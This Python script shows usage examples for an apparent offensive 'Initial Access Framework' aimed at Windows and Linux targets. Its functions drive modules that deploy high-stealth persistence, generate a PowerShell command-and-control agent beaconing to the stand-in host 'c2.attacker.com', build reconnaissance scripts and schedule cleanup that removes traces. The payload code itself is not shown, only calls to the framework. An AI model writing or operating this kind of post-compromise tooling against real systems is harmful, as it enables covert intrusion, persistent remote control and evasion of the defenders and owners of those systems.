#!/usr/bin/env python3
"""
Initial Access Framework - Usage Examples
Demonstrates common operational patterns
"""

import sys
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent / 'src'))

from ..Initial_access import InitialAccessHandler
from ..Initial_access.modules import (
    PersistenceManager,
    C2Manager,
    EnumerationManager,
    CleanupManager
)


def example_1_complete_protocol():
    """
    Example 1: Complete Initial Access Protocol
    
    Standard workflow - all phases executed
    """
    print("="*60)
    print("EXAMPLE 1: Complete Initial Access Protocol")
    print("="*60)
    
    handler = InitialAccessHandler(
        target_ip="10.10.10.50",
        c2_server="c2.attacker.com",
        platform="windows"
    )
    
    # Execute complete protocol
    success = handler.execute_initial_access_protocol()
    
    if success:
        # Get detailed summary
        summary = handler.get_operation_summary()
        print(f"\n✓ Operation completed in {summary['session']['elapsed_time']}")
        print(f"✓ Log entries: {summary['log_entries']}")


def example_2_custom_persistence():
    """
    Example 2: Custom Persistence Deployment
    
    Select specific persistence methods based on requirements
    """
    print("\n" + "="*60)
    print("EXAMPLE 2: Custom Persistence Selection")
    print("="*60)
    
    persistence = PersistenceManager(c2_server="c2.attacker.com")
    
    # Get all available methods
    all_methods = persistence.get_all_methods()
    print(f"\nAvailable persistence methods: {len(all_methods)}")
    
    # Filter by stealth level
    stealthy_methods = [
        m for m in all_methods 
        if m.stealth_level == 'high'
    ]
    
    print(f"\nHigh-stealth methods:")
    for method in stealthy_methods:
        print(f"  • {method.name} ({method.reliability} reliability)")
    
    # Generate deployment commands
    commands = persistence.generate_deployment_commands(stealthy_methods)
    print(f"\nGenerated {len(commands)} deployment commands")


def example_3_multi_channel_c2():
    """
    Example 3: Multi-Channel C2 Configuration
    
    Configure redundant command and control channels
    """
    print("\n" + "="*60)
    print("EXAMPLE 3: Multi-Channel C2 Setup")
    print("="*60)
    
    c2 = C2Manager(c2_server="c2.attacker.com")
    
    # Get channel configuration
    summary = c2.get_channel_summary()
    
    print(f"\nPrimary Channel:")
    print(f"  Type: {summary['primary']['type']}")
    print(f"  Server: {summary['primary']['server']}")
    print(f"  Beacon: {summary['primary']['beacon']}")
    
    print(f"\nFallback Channels: {len(summary['fallbacks'])}")
    for i, fallback in enumerate(summary['fallbacks'], 1):
        print(f"  {i}. {fallback['type']} - {fallback['server']} ({fallback['beacon']})")
    
    # Generate PowerShell agent
    agent_script = c2.generate_powershell_agent(session_id="demo-session")
    print(f"\nGenerated C2 agent: {len(agent_script)} characters")


def example_4_targeted_enumeration():
    """
    Example 4: Targeted Enumeration
    
    Execute specific enumeration categories
    """
    print("\n" + "="*60)
    print("EXAMPLE 4: Targeted Enumeration")
    print("="*60)
    
    enum = EnumerationManager(platform="windows")
    
    # Get critical commands only
    critical = enum.get_critical_commands()
    print(f"\nCritical commands: {len(critical)}")
    
    # Group by category
    categories = {}
    for cmd in critical:
        if cmd.category not in categories:
            categories[cmd.category] = []
        categories[cmd.category].append(cmd)
    
    print(f"\nCategories:")
    for category, commands in categories.items():
        print(f"  • {category}: {len(commands)} commands")
    
    # Generate enumeration script
    script = enum.generate_batch_script(output_file="recon_results.txt")
    print(f"\nGenerated batch script: {len(script)} characters")


def example_5_automated_cleanup():
    """
    Example 5: Automated Cleanup Configuration
    
    Set up proactive artifact removal
    """
    print("\n" + "="*60)
    print("EXAMPLE 5: Automated Cleanup")
    print("="*60)
    
    cleanup = CleanupManager(platform="windows")
    
    # Get cleanup summary
    summary = cleanup.get_cleanup_summary()
    
    print(f"\nTotal cleanup tasks: {summary['total_tasks']}")
    print(f"\nBy frequency:")
    for freq, count in summary['by_frequency'].items():
        print(f"  • {freq.capitalize()}: {count} tasks")
    
    print(f"\nBy risk level:")
    for risk, count in summary['by_risk'].items():
        print(f"  • {risk.capitalize()}: {count} tasks")
    
    # Generate hourly cleanup script
    hourly_script = cleanup.generate_cleanup_script(frequency='hourly')
    print(f"\nGenerated hourly cleanup script: {len(hourly_script)} characters")
    
    # Generate scheduled task
    scheduled = cleanup.generate_scheduled_cleanup()
    print(f"Generated scheduled task configuration: {len(scheduled)} characters")


def example_6_linux_operations():
    """
    Example 6: Linux Target Operations
    
    All capabilities work on Linux targets too
    """
    print("\n" + "="*60)
    print("EXAMPLE 6: Linux Target Operations")
    print("="*60)
    
    handler = InitialAccessHandler(
        target_ip="192.168.1.100",
        c2_server="c2.attacker.com",
        platform="linux"
    )
    
    print(f"\nPlatform: {handler.platform.upper()}")
    
    # Check enumeration commands
    enum_summary = handler.enumeration.get_enumeration_checklist()
    print(f"Enumeration commands available: {enum_summary['total_commands']}")
    print(f"Categories: {', '.join(enum_summary['categories'])}")
    
    # Check cleanup tasks
    cleanup_summary = handler.cleanup.get_cleanup_summary()
    print(f"Cleanup tasks available: {cleanup_summary['total_tasks']}")


def example_7_operation_logging():
    """
    Example 7: Detailed Operation Logging
    
    Demonstrate comprehensive logging capabilities
    """
    print("\n" + "="*60)
    print("EXAMPLE 7: Operation Logging")
    print("="*60)
    
    handler = InitialAccessHandler(
        target_ip="10.10.10.50",
        c2_server="c2.attacker.com"
    )
    
    # Execute just verification phase
    handler.verify_initial_access()
    
    # Get log entries
    logs = handler.log.get_logs()
    print(f"\nTotal log entries: {len(logs)}")
    
    # Filter by status
    successful = handler.log.get_logs_by_status('SUCCESS')
    failed = handler.log.get_logs_by_status('FAILED')
    
    print(f"Successful actions: {len(successful)}")
    print(f"Failed actions: {len(failed)}")
    
    # Generate report
    report = handler.log.generate_report()
    print(f"\nGenerated operation report: {len(report)} characters")


def example_8_session_management():
    """
    Example 8: Session State Management
    
    Track operation state and timing
    """
    print("\n" + "="*60)
    print("EXAMPLE 8: Session Management")
    print("="*60)
    
    handler = InitialAccessHandler(
        target_ip="10.10.10.50",
        c2_server="c2.attacker.com"
    )
    
    # Get initial session status
    status = handler.session.get_session_status()
    
    print(f"\nSession ID: {status['session_id']}")
    print(f"Target: {status['target']}")
    print(f"C2 Server: {status['c2_server']}")
    print(f"Elapsed Time: {status['elapsed_time']}")
    
    print(f"\nPhase completion status:")
    for phase, completed in status['phases'].items():
        status_icon = "✓" if completed else "○"
        print(f"  {status_icon} {phase.replace('_', ' ').title()}")


def main():
    """Run all examples"""
    print("""
╔═══════════════════════════════════════════════════════════╗
║     INITIAL ACCESS FRAMEWORK - USAGE EXAMPLES             ║
╚═══════════════════════════════════════════════════════════╝
    """)
    
    try:
        example_1_complete_protocol()
        example_2_custom_persistence()
        example_3_multi_channel_c2()
        example_4_targeted_enumeration()
        example_5_automated_cleanup()
        example_6_linux_operations()
        example_7_operation_logging()
        example_8_session_management()
        
        print("\n" + "="*60)
        print("All examples completed successfully!")
        print("="*60)
        
    except KeyboardInterrupt:
        print("\n\nExamples interrupted by user")
    except Exception as e:
        print(f"\n[!] Error in examples: {str(e)}")
        import traceback
        traceback.print_exc()


if __name__ == '__main__':
    main()
